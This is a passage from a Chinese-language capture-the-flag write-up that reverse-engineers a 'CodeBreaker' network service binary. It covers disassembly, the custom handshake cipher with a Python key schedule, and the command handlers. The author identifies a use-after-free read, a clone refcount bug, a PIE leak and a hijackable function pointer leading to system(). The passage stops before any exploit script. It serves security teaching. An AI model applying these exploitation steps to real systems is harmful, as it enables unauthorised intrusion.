條件跳（\texttt{je}=相等、\texttt{jne}=不等、\texttt{ja/}jb\texttt{=無號大/\allowbreak{}小、}jg/jl\texttt{=有號大/\allowbreak{}小、}js\texttt{=負、}jge\texttt{=有號\ \allowbreak{}≥）\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}\textbar{}\allowbreak{}}call\texttt{\textbar{}\allowbreak{}\ \allowbreak{}push\ \allowbreak{}返回位址\ \allowbreak{}+\ \allowbreak{}跳\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}\textbar{}\allowbreak{}}ret\texttt{\textbar{}\allowbreak{}\ \allowbreak{}pop\ \allowbreak{}返回位址\ \allowbreak{}+\ \allowbreak{}跳（**ROP\ \allowbreak{}的核心**）\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}\textbar{}\allowbreak{}}push\texttt{/}pop\texttt{\textbar{}\allowbreak{}\ \allowbreak{}把值放上/\allowbreak{}拿下\ \allowbreak{}stack（}rsp\texttt{同時\ \allowbreak{}-\allowbreak{}8/+8）\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}\textbar{}\allowbreak{}}leave\texttt{\textbar{}\allowbreak{}\ \allowbreak{}等於}mov
rsp,rbp; pop
rbp\texttt{（本題沒用到，但要知道）\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}\textbar{}\allowbreak{}}movzx dst,
src\texttt{\textbar{}\allowbreak{}\ \allowbreak{}把**小**的值**零擴展**到大（例：}movzx r15d,
dx\texttt{把\ \allowbreak{}16-\allowbreak{}bit\ \allowbreak{}讀成\ \allowbreak{}32-\allowbreak{}bit\ \allowbreak{}且高位補\ \allowbreak{}0）\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}\textbar{}\allowbreak{}}movsxd\texttt{\textbar{}\allowbreak{}\ \allowbreak{}有號擴展（例：}movsxd
rax, dword
{[}rbp+rax*4{]}\texttt{把\ \allowbreak{}32-\allowbreak{}bit\ \allowbreak{}有號位移讀成\ \allowbreak{}64-\allowbreak{}bit）\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}\textbar{}\allowbreak{}}cdqe\texttt{\textbar{}\allowbreak{}\ \allowbreak{}把}eax\texttt{有號擴展成}rax\texttt{\textbar{}\allowbreak{}\ \allowbreak{}\textbar{}\allowbreak{}}imul\texttt{\textbar{}\allowbreak{}\ \allowbreak{}有號乘法\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}\textbar{}\allowbreak{}}shl\texttt{/}shr\texttt{/}sar\texttt{\textbar{}\allowbreak{}\ \allowbreak{}左移/\allowbreak{}邏輯右移/\allowbreak{}算術右移\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}\textbar{}\allowbreak{}}rol\texttt{/}ror\texttt{\textbar{}\allowbreak{}\ \allowbreak{}循環移位（本題用}rol
al,3\texttt{做加密）\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}\textbar{}\allowbreak{}}movdqa\texttt{/}movaps\texttt{/}movups\texttt{/}movdqu\texttt{\textbar{}\allowbreak{}\ \allowbreak{}SSE\ \allowbreak{}一次搬\ \allowbreak{}16\ \allowbreak{}bytes；}dqa\texttt{/}aps\texttt{要求\ \allowbreak{}**16-\allowbreak{}byte\ \allowbreak{}對齊**，沒對齊會}\#GP\texttt{→\ \allowbreak{}程式掛掉\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}\textbar{}\allowbreak{}}endbr64` \\
\end{longtable}
}

\paragraph{\texorpdfstring{2.4
\texttt{\_\allowbreak{}start}：程式從哪裡開始？}{2.4 \_start：程式從哪裡開始？}}\label{startux7a0bux5f0fux5f9eux54eaux88e1ux958bux59cb}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
00000000000012a0 <.text+0xe0>:
    12a0: f3 0f 1e fa          endbr64
    12a4: 31 ed                xor    ebp,ebp                    ; rbp = 0 (最外層 frame)
    12a6: 49 89 d1             mov    r9,rdx                     ; r9 = rtld_fini
    12a9: 5e                   pop    rsi                        ; rsi = argc
    12aa: 48 89 e2             mov    rdx,rsp                    ; rdx = argv
    12ad: 48 83 e4 f0          and    rsp,0xfffffffffffffff0     ; 16-byte 對齊
    12b1: 50                   push   rax
    12b2: 54                   push   rsp
    12b3: 45 31 c0             xor    r8d,r8d                    ; r8 = fini = 0
    12b6: 31 c9                xor    ecx,ecx                    ; rcx = init = 0
    12b8: 48 8d 3d 01 ff ff ff lea    rdi,[rip+0xffffffffffffff01]  # 11c0  <-- main!
    12bf: ff 15 fb 2c 00 00    call   QWORD PTR [rip+0x2cfb]      # 3fc0  <-- __libc_start_main
    12c5: f4                   hlt
\end{Verbatim}

\textbf{找 \texttt{main}
的方法}：\texttt{\_\allowbreak{}\_\allowbreak{}libc\_\allowbreak{}start\_\allowbreak{}main(main,\allowbreak{}\ \allowbreak{}argc,\allowbreak{}\ \allowbreak{}argv,\allowbreak{}\ \allowbreak{}init,\allowbreak{}\ \allowbreak{}fini,\allowbreak{}\ \allowbreak{}rtld\_\allowbreak{}fini,\allowbreak{}\ \allowbreak{}stack\_\allowbreak{}end)}，
第一個參數是 \texttt{rdi}。這裡 \texttt{lea\ \allowbreak{}rdi,{[}rip-\allowbreak{}0xff{]}} 算出
\texttt{0x11c0} ⇒ \textbf{\texttt{main\ \allowbreak{}=\ \allowbreak{}0x11c0}}。

\paragraph{2.5 PLT / GOT 與 lazy
binding}\label{plt-got-ux8207-lazy-binding}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0000000000001150 <system@plt>:
    1150: f3 0f 1e fa          endbr64
    1154: ff 25 ce 2e 00 00    jmp    QWORD PTR [rip+0x2ece]   # 4028   <-- system 的 GOT 項
    115a: 66 0f 1f 44 00 00    nop    WORD PTR [rax+rax*1+0x0]
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  \textbf{GOT (.got.plt)}：一張「函式指標表」。\texttt{0x4028} 這格（=
  \texttt{system} 的 GOT 項）第一次被 呼叫前指向的是 \textbf{PLT0 +
  stub} 的模式（\texttt{0x1020} 是
  PLT0：\texttt{push\ \allowbreak{}{[}GOT+8{]};\ \allowbreak{}jmp\ \allowbreak{}{[}GOT+16{]}}），
  會去呼叫動態連結器把真的 libc \texttt{system} 位址填進去（\textbf{lazy
  binding}），之後就直接跳。 每個函式的 stub 固定 0x10
  bytes：\texttt{system} 是\textbf{第 6 個} JUMP\_SLOT
  （\texttt{0x4028\ \allowbreak{}=\ \allowbreak{}0x4000\ \allowbreak{}+\ \allowbreak{}5*8}），所以它自己的 stub 在
  \textbf{\texttt{0x1080}}（\texttt{0x1030\ \allowbreak{}+\ \allowbreak{}5*0x10}）， 內容是
  \texttt{push\ \allowbreak{}0x5;\ \allowbreak{}jmp\ \allowbreak{}0x1020}。 （\texttt{0x1030} 是\textbf{第 1
  個} JUMP\_SLOT，也就是 \texttt{free} 的 stub ------ 別認錯。）
\item
  \textbf{PLT}：一段「跳板」，把 \texttt{call\ \allowbreak{}system@plt} 轉成「跳到
  GOT 裡記的位址」。
\item
  對攻擊者的意義：\texttt{system@plt} 這個位址\textbf{從頭到尾固定}（PIE
  base + 0x1150）， 所以只要知道 PIE base，就能拿到「一個能呼叫 system
  的位址」。
\item
  本題 \texttt{main} 一開始就呼叫了 \texttt{system("true")}（見
  2.6），所以 \texttt{system} 的 GOT 早就被解析好了。
\end{itemize}

\paragraph{\texorpdfstring{2.6
\texttt{main}（0x11c0）逐行}{2.6 main（0x11c0）逐行}}\label{main0x11c0ux9010ux884c}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
00000000000011c0 <main>:
    11c0: f3 0f 1e fa          endbr64
    11c4: 48 83 ec 08          sub    rsp,0x8            ; 對齊
    11c8: 48 8d 3d 44 0e 00 00 lea    rdi,[rip+0xe44]   # 2013  -> "true"
    11cf: e8 7c ff ff ff       call   1150 <system@plt> ; system("true")  <== 作者故意的「禮物」
    11d4: 66 0f 6f 05 64 0f 00 movdqa xmm0,[rip+0xf64]  # 2140  -> "CodeBreaker\0\0\0\0"
    11dc: 48 8d 05 ad 01 00 00 lea    rax,[rip+0x1ad]   # 1390  -> endbr64; ret  (空函式 stub)
    11e3: 31 d2                xor    edx,edx
    11e5: 48 89 05 d4 2e 00 00 mov    [rip+0x2ed4],rax  # 40c0  ; *把 stub 存進全域函式指標*
    11ec: 48 b8 32 2e 31 2e 34 movabs rax,0x342e312e32       ; "2.1.4"
    11f6: 0f 11 05 cb 2e 00 00 movups [rip+0x2ecb],xmm0 # 40c8  ; 40c8 = "CodeBreaker"
    11fd: 66 0f ef c0          pxor   xmm0,xmm0               ; xmm0 = 0
    1201: 48 89 15 08 2f 00 00 mov    [rip+0x2f08],rdx  # 4110  ; 清零
    1208: 0f 11 05 d9 2e 00 00 movups [rip+0x2ed9],xmm0 # 40e8
    120f: 48 89 05 f2 2e 00 00 mov    [rip+0x2ef2],rax  # 4108  ; "2.1.4" 版本字串
    1216: c7 05 08 2f 00 00 30 mov    DWORD [rip+0x2f08],0x30 # 4128
    1220: 0f 11 05 b1 2e 00 00 movups [rip+0x2eb1],xmm0 # 40d8
    1227: 0f 11 05 c9 2e 00 00 movups [rip+0x2ec9],xmm0 # 40f7
    122e: 0f 11 05 e2 2e 00 00 movups [rip+0x2ee2],xmm0 # 4117
    1235: e8 36 04 00 00       call   1670                ; 握手 handshake
    123a: 89 c2                mov    edx,eax
    123c: b8 01 00 00 00       mov    eax,0x1
    1241: 85 d2                test   edx,edx
    1243: 78 07                js     124c                ; 握手失敗 -> 直接結束
    1245: e8 b6 06 00 00       call   1900                ; 指令主迴圈
    124a: 31 c0                xor    eax,eax
    124c: 48 83 c4 08          add    rsp,0x8
    1250: c3                   ret
\end{Verbatim}

重點：\textbf{\texttt{0x40c0} = 一個「函式指標」，預設值是
\texttt{0x1390}（\texttt{endbr64;\ \allowbreak{}ret}，等於什麼都不做）}。 後面指令
\texttt{0x15} 會 \texttt{call\ \allowbreak{}{[}0x40c0{]}}。這就是我們的攻擊目標。

\texttt{.\allowbreak{}rodata}（\texttt{objdump\ \allowbreak{}-\allowbreak{}s\ \allowbreak{}-\allowbreak{}j\ \allowbreak{}.\allowbreak{}rodata}）告訴我們字串位置：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
 2000 01000200 72002f64 65762f75 72616e64   ....r./dev/urand
 2010 6f6d0074 72756500 ...                 om.true.
 2020 30fcffff a0fbffff 20fbffff c8faffff   <-- 0x16~0x10 指令的 jump table
 2030 60faffff e0f9ffff e8fcffff 00000000
 2040 b782bfe0 ...  (256 bytes 的 S-box)
 2140 436f6465 42726561 6b657200            "CodeBreaker"
\end{Verbatim}

另外 \texttt{0x2004} 是 \texttt{"r"}（fopen 的模式），\texttt{0x2006} 是
\texttt{"/\allowbreak{}dev/\allowbreak{}urandom"}。

\paragraph{\texorpdfstring{2.7 讀/寫底層：\texttt{read\_\allowbreak{}exact}(0x13a0)
與
\texttt{send}(0x1450)}{2.7 讀/寫底層：read\_exact(0x13a0) 與 send(0x1450)}}\label{ux8b80ux5bebux5e95ux5c64read_exact0x13a0-ux8207-send0x1450}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
00000000000013a0 <.text+0x1e0>:            ; int read_exact(void *buf /*rdi*/, size_t n /*rsi*/)
    13a0: 41 54              push   r12
    13a2: 49 89 fc           mov    r12,rdi              ; r12 = buf
    13a5: 55                 push   rbp
    13a6: 48 89 f5           mov    rbp,rsi              ; rbp = n
    13a9: 53                 push   rbx
    13aa: 31 db              xor    ebx,ebx              ; rbx = 已讀長度 = 0
    13ac: eb 0a              jmp    13b8
    13b0: 48 01 c3           add    rbx,rax              ; 已讀 += read() 的回傳值
    13b3: 48 39 eb           cmp    rbx,rbp
    13b6: 73 28              jae    13e0                 ; 讀滿了 -> return 0
    13b8: 48 89 ea           mov    rdx,rbp
    13bb: 31 ff              xor    edi,edi              ; rdi = 0  (fd 0 = stdin)
    13bd: 49 8d 34 1c        lea    rsi,[r12+rbx*1]      ; rsi = buf + 已讀
    13c1: 48 29 da           sub    rdx,rbx              ; rdx = n - 已讀
    13c4: e8 97 fd ff ff     call   1160 <read@plt>      ; read(0, buf+off, n-off)
    13c9: 48 85 c0           test   rax,rax
    13cc: 7f e2              jg     13b0                 ; >0 繼續；<=0 -> return -1
\end{Verbatim}

⇒ \textbf{這是一個「讀好讀滿」函式，短讀（short read）不會破壞協定}，TCP
分段也沒關係。

\texttt{0x1450} 則是「\textbf{寫一封訊息}」：先把長度做
\texttt{rol\ \allowbreak{}ax,\allowbreak{}8}（\textbf{host → big-endian}）， 寫 2 bytes
長度前綴，再寫資料。（\texttt{0x1510} 是「加密後再呼叫
0x1450」的版本。）

\paragraph{2.8
指令協定與解密迴圈（0x1900）}\label{ux6307ux4ee4ux5354ux5b9aux8207ux89e3ux5bc6ux8ff4ux57080x1900}

訊息格式（全部 \textbf{big-endian}）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
+--------+--------+-----------------------------------+
| len_hi | len_lo | payload (len bytes, 已被串流加密)  |
+--------+--------+-----------------------------------+
\end{Verbatim}

\texttt{payload{[}0{]}} = 指令碼，\texttt{payload{[}1..{]}} = 參數。

主迴圈（\texttt{0x1900}）先配置 0x3000+0x48 bytes 的 stack frame，並放上
canary：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    190a: 48 81 ec 00 10 00 00 sub rsp,0x1000      ; 大 stack frame（每 0x1000 一次
    1911: 48 83 0c 24 00       or  QWORD PTR [rsp],0x0   ; 是 glibc 的 stack probe，
    ... 重複三次 ...                                       ; 用來「摸」每一頁避免跳頁）
    192e: 48 83 ec 48          sub    rsp,0x48
    1932: 4c 8d 25 07 07 00 00 lea    r12,[rip+0x707]   # 2040  ; r12 = S-box
    1939: 4c 8d 35 90 29 00 00 lea    r14,[rip+0x2990]  # 42d0  ; r14 = K（16-byte 金鑰表）
    1940: 48 8d 2d d9 06 00 00 lea    rbp,[rip+0x6d9]   # 2020  ; rbp = jump table
    1947: 64 48 8b 04 25 28 00 00 00   mov rax,QWORD PTR fs:0x28   ; ← canary 讀出
    1950: 48 89 84 24 38 30 00 00      mov [rsp+0x3038],rax        ; ← 存到 rsp+0x3038
    1958: 31 c0                xor    eax,eax
    195a: 48 8d 44 24 2c       lea    rax,[rsp+0x2c]            ; &len
    195f: 48 8d 5c 24 30       lea    rbx,[rsp+0x30]            ; 訊息緩衝區 msg = rsp+0x30
    1964: 48 89 44 24 08       mov    [rsp+0x8],rax
    1970: 48 8b 74 24 08       mov    rsi,[rsp+0x8]
    1975: 48 89 df             mov    rdi,rbx
    1978: e8 73 fa ff ff       call   13f0                      ; 收一封訊息
    197d: 85 c0                test   eax,eax
    197f: 0f 88 97 04 00 00    js     1e1c                      ; 連線結束 -> 離開
    1985: 44 0f b7 6c 24 2c    movzx  r13d,WORD PTR [rsp+0x2c]     ; r13 = len
    198b: 66 45 85 ed          test   r13w,r13w
    198f: 74 df                je     1970                      ; len==0 就再收
    ; ---- 解密（串流密碼） ----
    1991: 44 8b 0d 28 29 00 00 mov    r9d,DWORD PTR [rip+0x2928] # 42c0  ; C = 收方計數器
    1998: 48 89 da             mov    rdx,rbx                   ; rdx = msg
    199b: 31 c9                xor    ecx,ecx                   ; i = 0
    199d: 44 89 cf             mov    edi,r9d
    19a0: 29 df                sub    edi,ebx                   ; edi = C - (msg 的低 32 位)
    19a8: 48 89 ce             mov    rsi,rcx                   ; rsi = i
    19ab: 8d 04 17             lea    eax,[rdi+rdx]             ; eax = (C - msg) + (msg+i) = C+i
    19ae: 83 c1 01             add    ecx,0x1
    19b1: 83 e6 0f             and    esi,0xf                   ; i & 0xf   <== 注意：用「訊息內」的索引
    19b4: 41 02 04 36          add    al,BYTE PTR [r14+rsi*1]   ; al += K[i & 0xf]
    19b8: 0f b6 c0             movzx  eax,al
    19bb: 41 0f b6 04 04       movzx  eax,BYTE PTR [r12+rax*1] ; al = S[(C+i+K[i&0xf]) & 0xff]
    19c0: 30 02                xor    BYTE PTR [rdx],al         ; msg[i] ^= al
    19c2: 48 83 c2 01          add    rdx,0x1
    19c6: 66 44 39 e9          cmp    cx,r13w
    19ca: 72 dc                jb     19a8
    ; ---- 更新計數器 & 分派 ----
    19cc: 41 8d 55 ff          lea    edx,[r13-0x1]             ; edx = len-1
    19d0: 0f b6 4c 24 30       movzx  ecx,BYTE PTR [rsp+0x30]     ; cl = 指令碼
    19d5: 44 0f b7 fa          movzx  r15d,dx                   ; r15 = len-1
    19d9: 43 8d 44 39 01       lea    eax,[r9+r15*1+0x1]
    19de: 89 05 dc 28 00 00    mov    [rip+0x28dc],eax          # 42c0  ; 計數器 += len
    19e4: 8d 41 f0             lea    eax,[rcx-0x10]            ; 指令碼 - 0x10
    19e7: 3c 06                cmp    al,0x6
    19e9: 0f 87 52 04 00 00    ja     1e41                      ; 不在 0x10~0x16 -> 錯誤回應
    19ef: 0f b6 c0             movzx  eax,al
    19f2: 48 63 44 85 00       movsxd rax,DWORD PTR [rbp+rax*4+0x0]  ; 讀 jump table 的 32-bit 位移
    19f7: 48 01 e8             add    rax,rbp                   ; 目標 = 0x2020 + 位移
    19fa: 3e ff e0             notrack jmp rax                   ; 跳過去！
\end{Verbatim}

\textbf{加密公式（本題最關鍵的數學）}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
keystream(C, i) = S[ (C + i + K[i & 0xf]) & 0xff ]
msg[i] ^= keystream(C, i)
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  \texttt{C} =
  這封訊息開始時的全域計數器（收/送各有一個：\texttt{0x42c0}
  收、\texttt{0x42c4} 送）
\item
  \texttt{i} = \textbf{訊息內的} byte 索引（0 開始）⇒ \textbf{\texttt{K}
  的索引用 \texttt{i\ \allowbreak{}\&\allowbreak{}\ \allowbreak{}0xf}，不是 \texttt{(C+i)\ \allowbreak{}\&\allowbreak{}\ \allowbreak{}0xf}}！
  （這裡我第一次逆錯，導致指令只有第 0 個 byte
  解得對、後面全錯，花了很久才抓到。切記！）
\item
  \texttt{S} = \texttt{.\allowbreak{}rodata\ \allowbreak{}0x2040} 那 256 bytes 的表，\texttt{K} =
  握手算出來的 16 bytes 金鑰表
\end{itemize}

由於兩邊的計數器都從 0 起算且都用「已處理 byte
數」，\textbf{加密與解密是同一個函式}。

指令 jump table（\texttt{0x2020}，每個是 4-byte 有號位移，基準是
\texttt{0x2020}）：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
指令
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
位移
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
處理函式
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
功能
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{0x10} & \texttt{-\allowbreak{}0x3d0} & \texttt{0x1c50} &
alloc：\texttt{malloc(size)}，存進 slot \\
\texttt{0x11} & \texttt{-\allowbreak{}0x460} & \texttt{0x1bc0} & read：把 slot
的資料傳回給我們 \\
\texttt{0x12} & \texttt{-\allowbreak{}0x4e0} & \texttt{0x1b40} & write：把資料寫進
slot（\textbf{上限 = slot.size}） \\
\texttt{0x13} & \texttt{-\allowbreak{}0x538} & \texttt{0x1ae8} &
free：\texttt{free(slot.\allowbreak{}ptr)} 並把 refcount -1 \\
\texttt{0x14} & \texttt{-\allowbreak{}0x5a0} & \texttt{0x1a80} & clone：把 slot B
複製到空的 slot A（\textbf{本題漏洞在這裡}） \\
\texttt{0x15} & \texttt{-\allowbreak{}0x620} & \texttt{0x1a00} &
call：\texttt{call\ \allowbreak{}{[}0x40c0{]}(我們的字串)} \\
\texttt{0x16} & \texttt{-\allowbreak{}0x318} & \texttt{0x1d08} & dump：把
\texttt{0x40c0} 起 240 bytes 傳回來（\textbf{PIE leak}） \\
\end{longtable}
}

\paragraph{2.9
握手（0x1670）：金鑰交換與驗證}\label{ux63e1ux624b0x1670ux91d1ux9470ux4ea4ux63dbux8207ux9a57ux8b49}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    1688: 48 8d 35 75 09 00 00 lea rsi,[rip+0x975]  # 2004 -> "r"
    168f: 48 8d 3d 70 09 00 00 lea rdi,[rip+0x970]  # 2006 -> "/dev/urandom"
    16a9: e8 02 fb ff ff       call 11b0 <fopen@plt>
    16ae: 48 85 c0             test rax,rax
    16b1: 0f 84 f9 01 00 00    je   18b0                    ; 開不起來就失敗
    16b7: 48 8d 7c 24 10       lea  rdi,[rsp+0x10]           ; buf
    16bc: 48 89 c1             mov  rcx,rax                  ; FILE *
    16bf: ba 10 00 00 00       mov  edx,0x10                 ; nmemb = 16
    16c7: be 01 00 00 00       mov  esi,0x1                  ; size = 1
    16cc: e8 3f fa ff ff       call 1110 <fread@plt>        ; fread(buf,1,16,fp)
    16d4: 48 83 f8 10          cmp  rax,0x10
    16d8: 0f 85 0e 02 00 00    jne  18ec                     ; **短讀就失敗**（沒有 uninit 洩漏）
    16e3: 48 8d 5c 24 40       lea  rbx,[rsp+0x40]
    16f6: c6 44 24 40 01       mov  BYTE PTR [rsp+0x40],0x1  ; 標籤 = 1
    16fb: 0f 11 4c 24 41       movups [rsp+0x41],xmm1        ; 16 bytes nonce
    1700: e8 4b fd ff ff       call 1450                     ; 明文送出：01 || Ns
    1718: e8 d3 fc ff ff       call 13f0                     ; 收我們回覆
    1725: 66 83 7c 24 0c 10    cmp  WORD PTR [rsp+0xc],0x10
    172b: 0f 86 7f 01 00 00    jbe  18b0                     ; 長度必須 > 16
    1731: 80 7c 24 40 02       cmp  BYTE PTR [rsp+0x40],0x2  ; 標籤必須 = 2
    1736: 0f 85 74 01 00 00    jne  18b0
\end{Verbatim}

然後是金鑰排程（4 輪 × 16 bytes）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    1776: 0f 29 54 24 20       movaps [rsp+0x20],xmm2        ; buf[0..15]  = Ns（伺服器 nonce）
    177b: 0f 29 5c 24 30       movaps [rsp+0x30],xmm3        ; buf[16..31] = Nc（我們送的 nonce）
    1790: 8d 14 06             lea    edx,[rsi+rax*1]        ; 索引 (j + 8*r) & 0x1f
    1793: 48 83 c0 01          add    rax,0x1
    1797: 48 83 c1 01          add    rcx,0x1
    179b: 83 e2 1f             and    edx,0x1f
    179e: 0f b6 54 14 20       movzx  edx,BYTE PTR [rsp+rdx*1+0x20]
    17a3: 32 50 ff             xor    dl,BYTE PTR [rax-0x1]  ; ^ K[j]
    17a6: 0f b6 d2             movzx  edx,dl
    17a9: 0f b6 54 15 00       movzx  edx,BYTE PTR [rbp+rdx*1+0x0] ; S[...]
    17ae: 32 51 ff             xor    dl,BYTE PTR [rcx-1]    ; ^ buf[3r+j]
    17b1: c0 c2 03             rol    dl,0x3
    17b4: 88 50 ff             mov    BYTE PTR [rax-0x1],dl  ; K[j] = rol8(S[buf[..]^K[j]] ^ buf[3r+j], 3)
    17b7: 48 39 c7             cmp    rdi,rax
    17ba: 75 d4                jne    1790
    17bc: 41 83 c0 03          add    r8d,0x3
    17c0: 49 83 c1 03          add    r9,0x3                 ; buf 前進 3
    17c4: 83 c6 08             add    esi,0x8
    17c7: 41 83 f8 0c          cmp    r8d,0xc
    17cb: 75 b3                jne    1780                   ; 共 4 輪
\end{Verbatim}

Python 等價：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{K }\OperatorTok{=}\NormalTok{ [}\DecValTok{0}\NormalTok{]}\OperatorTok{*}\DecValTok{16}
\NormalTok{buf }\OperatorTok{=}\NormalTok{ Ns }\OperatorTok{+}\NormalTok{ Nc                       }\CommentTok{\# 32 bytes}
\ControlFlowTok{for}\NormalTok{ r }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{4}\NormalTok{):}
    \ControlFlowTok{for}\NormalTok{ j }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{16}\NormalTok{):}
\NormalTok{        K[j] }\OperatorTok{=}\NormalTok{ rol8(S[buf[(j }\OperatorTok{+} \DecValTok{8}\OperatorTok{*}\NormalTok{r) }\OperatorTok{\&} \BaseNTok{0x1f}\NormalTok{] }\OperatorTok{\^{}}\NormalTok{ K[j]] }\OperatorTok{\^{}}\NormalTok{ buf[}\DecValTok{3}\OperatorTok{*}\NormalTok{r }\OperatorTok{+}\NormalTok{ j], }\DecValTok{3}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

接著把兩個計數器歸零、收第三封訊息（標籤 3 + 16 bytes 驗證碼）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
    17cd: c7 05 ed 2a 00 00 00 mov DWORD PTR [rip+0x2aed],0x0  # 42c4   ; 送方計數器 = 0
    17dd: c7 05 d9 2a 00 00 00 mov DWORD PTR [rip+0x2ad9],0x0  # 42c0   ; 收方計數器 = 0
    17e7: e8 04 fc ff ff       call 13f0
    1844: 66 83 fe 10          cmp  si,0x10
    1848: 76 66                jbe  18b0                           ; len > 16
    184a: 80 7c 24 40 03       cmp  BYTE PTR [rsp+0x40],0x3         ; 標籤 = 3
    184f: 75 5f                jne  18b0
    1851: c6 44 24 0e 04       mov  BYTE PTR [rsp+0xe],0x4          ; 回應：04 ?? 
    1860: 41 0f b6 0c 04       movzx ecx,BYTE PTR [r12+rax*1]       ; K[i]
    1865: 8d 50 05             lea  edx,[rax+0x5]
    1868: 83 e2 0f             and  edx,0xf
    186b: 41 0f b6 14 14       movzx edx,BYTE PTR [r12+rdx*1]       ; K[(i+5)&0xf]
    1870: 32 54 0d 00          xor  dl,BYTE PTR [rbp+rcx*1+0x0]      ; ^ S[K[i]]
    1874: 41 88 54 05 00       mov  BYTE PTR [r13+rax*1+0x0],dl      ; 期望值[i]
    188d: 48 33 44 24 20       xor  rax,QWORD PTR [rsp+0x20]
    1897: 48 09 d0             or   rax,rdx
    189a: 74 3a                je   18d6                           ; 全部相同 -> 成功
\end{Verbatim}

所以我們必須送：\texttt{0x03\ \allowbreak{}\textbar{}\allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}(S{[}K{[}i{]}{]}\ \allowbreak{}\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}K{[}(i+5)\&\allowbreak{}0xf{]})\ \allowbreak{}for\ \allowbreak{}i\ \allowbreak{}in\ \allowbreak{}0..\allowbreak{}15}（整封用
counter=0 加密）。

握手完成後：\textbf{收方計數器 = 17}（第三封訊息 17
bytes），\textbf{送方計數器 = 2}（回應 \texttt{04\ \allowbreak{}00}）。
之後每一封訊息 \texttt{計數器\ \allowbreak{}+=\ \allowbreak{}訊息長度}，所以兩邊都把「絕對 byte
offset」當作 stream position。

\paragraph{2.10 物件槽（slot
table）與指令細節}\label{ux7269ux4ef6ux69fdslot-tableux8207ux6307ux4ee4ux7d30ux7bc0}

\texttt{0x41c0} 開始是 \textbf{16 個 slot，每個 16 bytes}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
struct slot {          // 共 0x10 bytes
    void *ptr;         // +0x00  malloc 回來的指標
    u16   size;        // +0x08  這塊記憶體的大小（<= 0x400）
    u16   refcount;    // +0x0a  引用計數（= 有幾個 slot 指向它）
    /* +0x0c..0x0f padding */
};
\end{Verbatim}

\textbf{\texttt{0x10} alloc（0x1c50）}：檢查
\texttt{len\textgreater{}\allowbreak{}3}、\texttt{index\textless{}\allowbreak{}=0xf}、slot
必須是空的、 \texttt{size} 為 big-endian 的 2
bytes、\texttt{1\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}size\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}0x400}、\texttt{size+2\ \allowbreak{}\textless{}\allowbreak{}\ \allowbreak{}len-\allowbreak{}1}，
然後 \texttt{malloc(size)} +
\texttt{\_\allowbreak{}\_\allowbreak{}memcpy\_\allowbreak{}chk(malloc\_\allowbreak{}ptr,\allowbreak{}\ \allowbreak{}msg+4,\allowbreak{}\ \allowbreak{}size,\allowbreak{}\ \allowbreak{}size)}（\textbf{destlen
= size， 所以不可能溢位}），最後
\texttt{slot.\allowbreak{}ptr=ptr;\ \allowbreak{}slot.\allowbreak{}size=size;\ \allowbreak{}slot.\allowbreak{}refcount=1}。

\textbf{\texttt{0x11} read（0x1bc0）}：把 \texttt{slot.\allowbreak{}size} bytes 從
\texttt{slot.\allowbreak{}ptr} 複製到回應緩衝區送出，
長度前綴會蓋在回應裡。（\textbf{沒有檢查是不是已釋放} ⇒ UAF read！）

\textbf{\texttt{0x12}
